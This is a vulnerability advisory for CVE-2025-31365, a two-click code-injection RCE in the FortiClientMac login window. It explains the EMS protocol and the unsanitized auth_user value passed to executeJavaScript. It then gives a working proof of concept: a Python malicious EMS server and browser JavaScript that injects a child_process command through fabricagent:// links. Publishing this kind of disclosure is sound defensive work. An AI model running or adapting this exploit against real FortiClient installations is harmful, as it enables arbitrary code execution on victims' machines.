---
title: "FortiClient: Two-click RCE via Code Injection in the Login Window"
date: 2025-10-14
tags:
    - "rce"
    - "forticlient"
    - "fortinet"
    - "code injection"
advisory: true
cves:
	- "CVE-2025-31365"
---
# Background
### Communication
The FortiClient application is meant to be connected and managed by an "Endpoint Management Server" (EMS). Aside from the Electron UI, there are multiple components to the Forticlient application, with each one having its own responsibility. One of them is the `Fortinet/FortiClient/bin/epctrl` file which is responsible for the network communication part. Communication between the server and the client is handled via a custom protocol. To simplify matters, the flow goes like this:
1.  First, a Probe request (`X-FCCK-PROBE`) is sent, and then the server replies with basic EMS information which verifies that the server is an actual EMS.
2.  The second request is a registration one containing information on the client (`X-FCCK-REGISTER`).
3.  If the registration is successful, the connection is maintained via keep-alive messages every `X` amount of time, which is defined by the server (`X-FCCK-KA`).

In this line-based protocol, each header is represented via a new line. The body contains the type of the message followed by the fields/values which are separated by the `|` char, for example, a "probe" reply will look as such:\
`FCPROBERPLY: Key1|Value1|Key2|Value2|\r\n`

### Authentication
The FortiClient Electron app handles URLs of the scheme `fabricagent://`. By using the `​​fabricagent://ems?inviteCode=...` URL, FortiClient will connect to an on-premise or Fortinet-hosted server depending on if the `inviteCode` parameter starts with a `_` character. The code is a base64-encoding of the following format - `<version>:<fqdn>:<port?>:<vdom>:<invitation_code>` (`fqdn` == the IP of the EMS).

Using it, clients can connect to EMS conveniently by clicking on a link (**Forticlient will try to connect to the new EMS even if the client is already connected and/or requires a password to disconnect**). During connection, if needed, an authentication process is initialized with one of the following three types: `SAML`, `LDAP`, or `Local`.  

- In a `SAML` authentication flow, the server provides a URI which will be opened on the client machine in the browser. The link goes through the web SAML authentication, and finally opens an `onboarding` URL containing the SAML token:\
    `fabricagent://ems/onboarding?username=...&auth_token=...`

- In a `Local` or `LDAP` flow, Forticlient will create a basic login window as such:
<img src="/img/blogs/fortinet/advisories/simple_login_window.png" style="width: 75%; display: block; margin: auto;"/>

# Technical Details
When the client receives an “authenticate” reply from the EMS, it will go to the `​​promptUserAuth` function (in the `compliance.js` file). This will first check if a SAML URL is provided. If so, it will proceed with the flow described above. If not, it will create the basic login window with the `auth_ldap` and `auth_user` parameters.
```js
promptUserAuth() {
  if (!this.getUserAuthProgressing()) {
    this.viewConnecting();
    this.setUserAuthProgressing(true);
    if (this.data.auth_type === COMPLIANCE_AUTH_TYPE.SAML && this.data.hasOwnProperty('auth_saml') && this.data.auth_saml.length > 0) {
      ipcRenderer.send(IPC_RENDERER_REQUEST.SAML_LOGIN, {
        url: this.data.auth_saml,
        type: SAML_TYPES_ENUM.EMS,
      });
    } else {
      const basicAuthReq = {
        type: BASIC_AUTH_TYPES_ENUM.EMS,
      };
      if (this.data.hasOwnProperty('auth_ldap') && this.data.auth_ldap.length > 0) {
        basicAuthReq.ldap = this.data.auth_ldap;
      }
      if (this.data.hasOwnProperty('auth_user') && this.data.auth_user.length > 0) {
        basicAuthReq.auth_user = this.data.auth_user;
      }
      ipcRenderer.send(IPC_RENDERER_REQUEST.BASIC_LOGIN, basicAuthReq);
    }
  }
}
```
The `auth_ldap` and `auth_user` parameters are taken from the shared memory file stored at `/private/var/run/fctc.s` which is set when parsing the register reply (`FCREGRPLY`) by the `epctrl` binary.
At `epctrl::message::Register::ProcessAuth` in case the `AUTHTYPE` field exists in the response, the parameters will be reset including `auth_user` (the truncated part of the image, lines 34-96), and it will load `AUTHLDAP` and `AUTHSAML` key/value from the response to `auth_ldap` and `auth_saml` correspondingly.
<img src="/img/blogs/fortinet/advisories/processAuth_1.png" style="width: 100%;"/>
<img src="/img/blogs/fortinet/advisories/processAuth_2.png" style="width: 100%;"/>

Eventually, on the Electron side, the window is created in the `BasicAuthWindow` class with `nodeIntegration` set to `true`.
We noticed that the `auth_user` is formatted into a Javascript snippet (that is meant to prefill the user name) without any sanitization, which leads to Code Execution in case of a malicious `auth_user` value.

```js
createWindow(title, auth_user) {
  const win = new BrowserWindow(this.options);
  this.setWindow(win);
  win.loadFile(BASIC_AUTH_HTML_PATH);
  // win.webContents.openDevTools();
  if (title) {
    win.webContents.on('did-finish-load', () => {
      win.setTitle(title);
    });
  }
  if (auth_user) {
    const code = `
          const userNameEle = document.getElementById('username');
          const passwordEle = document.getElementById('password');
          userNameEle.setAttribute('placeholder', '${auth_user}');
          userNameEle.disabled = true;
          passwordEle.focus();
          `;
    win.webContents.executeJavaScript(code);
  }
  return win;
}
```
# Exploitation
In order for an attacker to be able to set an arbitrary `auth_user` parameter and show the basic login window, we came up with the following attack flow:
1.  A victim visits a malicious website which first opens a link to initialize a normal registration to a malicious EMS.
2.  The EMS responds with `AUTHLDAP`, which will prompt the user to sign in and remove any previous `AUTHSAML` value (This is an important step because it will "save" the login method as LDAP since in step 5 we don't include any "`AUTHTYPE`" key)
3.  After the EMS responds with an authentication request, a second "onboarding" link is opened automatically via the website. This link sets a malicious username and authenticates again in the background.
4.  The EMS responds with registration successfully to the onboarding request.
5.  The user either enters credentials or cancels the sign-in window.
6. In the next keep-alive message, the server will send an error message 14 (meant to authenticate the user again) but this time without `AUTHTYPE`. This will not overwrite any parameter (`auth_ldap`, `auth_saml`, `auth_user`), and will show the previous sign-in window, but this time with the injected Javascript code.

<img src="/img/blogs/fortinet/advisories/two-click_rce_attack_flow.png" style="width: 100%;"/>

We are not familiar with other ways to set arbitrary usernames and simultaneously trigger the vulnerable basic login window.
Malicious EMS code (simple cert and key are needed for SSL):

```python
import base64
import socket
import threading
import ssl
from os import path
import re

HOST = "127.0.0.1"
SERVER_PORT = 9999
cwd = "/home/ubuntu/Downloads"

class Server(threading.Thread):
    def __init__(self):
        super(Server, self).__init__()

    def run(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server = ssl.wrap_socket(server, server_side=True, keyfile=path.join(cwd, "key.pem"), certfile=path.join(cwd, "cert.pem"))
        server.bind((HOST, SERVER_PORT))
        server.listen(10)

        while True:
            back_data = b''
            connection, client_address = server.accept()
            data = connection.recv(4096)
            if b"X-FCCK-PROBE" in data:
                back_data = b"FCPROBERPLY: FGT|FCTEMS8823006072:202305081241mp6|FEATURE_BITMAP|7|EMSVER|7002004|PROTO_VERSION|1.0.0|PERCON|0|\r\n"
            elif b"X-FCCK-REGISTER" in data:
                b = re.findall(b"SYSINFO\|(.*)\|\r", data)[0]
                d = base64.b64decode(b.decode("utf-8"))
                if  b"child_process" in d:
                   back_data = b'FCREGRPLY: REG|0-FCTEMS0000126978:45:i-0fe611041e297e2e9:default:20:43230:1:8:227|AV_SIG|92.08424|LIC_FEATS|8671612|LIC_ED|1878508800|SOFT_CRC|2|EMS_ONNET|0|AUTH_PRD|0|TOKEN|00E5CBA5-7FDD-44E5-875A-AD535F1BCAAA|SERIAL|7E57D5B158B578D5BE60B7AF3FF8023D10D77268|TENANT|00000000000000000000000000000000|PROTO_VERSION|1.0.0|PERCON|0|\r\n'
                else:
                    back_data = b'FCREGRPLY: REG|14|AUTHTYPE|2|AUTHLDAP|title|ERR_MSG|Authentication error|\r\n'
            elif b"X-FCCK-KA" in data:
                back_data = b'FCKARPLY: CONT|1|ERROR|14|ERR_MSG|Authentication error|\r\n'
            elif b'DATA_HEADER' in data:
                back_data = b'UPLOADRPLY: STOP\r\n'
            connection.send(back_data)
            connection.close()

server = Server()
server.start()
```
Malicious website code, note that the second “onboarding” link is executed here with a simple timer. In a more refined scenario an attacker can time it by waiting in the EMS for a connection, and only then open on the web the second link:

```python
let maliciousEMSIp = `127.0.0.1:9999`;
let inviteCode = `1:${maliciousEMSIp}:default:aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa`;
let maliciousUserName = `test');require('child_process').execSync('open -a Calculator.app')//`;
window.location.href = `fabricagent://ems?inviteCode=_${btoa(code)}`;
setTimeout(()=>{window.location.href = `fabricagent://ems/onboarding?username=${maliciousUserName}`;}, 7000)
```

<video controls="" src="/videos/fortinet/two-click-RCE-fortinet.mov" style="width: 100%;"></video>

## Affected Product
FortiClientMac 7.2.1 through 7.2.8 and FortiClientMac 7.4.0 through 7.4.3

## Impact
A victim who is manipulated to click on a link might execute arbitrary code on their machine. By default, modern browsers also prompt users before opening an external application via a custom scheme, so it does require an additional click on the invite link as well as the onboarding one. Combined with ["Caught in the FortiNet"](https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-3-3/) local privilage escelation vulnerability, an attacker can elevate their privileges to root on macOS.

## Remediation
Update FortiClientMac to version 7.2.9, 7.4.4 or above.

## Credit
This issue was discovered and reported by [Yaniv Nizry](https://www.twitter.com/ynizry).

## Additional Resources
- ["Caught in the FortiNet" blogs](https://www.sonarsource.com/blog/caught-in-the-fortinet-how-attackers-can-exploit-forticlient-to-compromise-organizations-1-3/)
- [Fortinet's Advisory](https://www.fortiguard.com/psirt/FG-IR-25-037)
- [CVE-2025-31365](https://nvd.nist.gov/vuln/detail/CVE-2025-31365)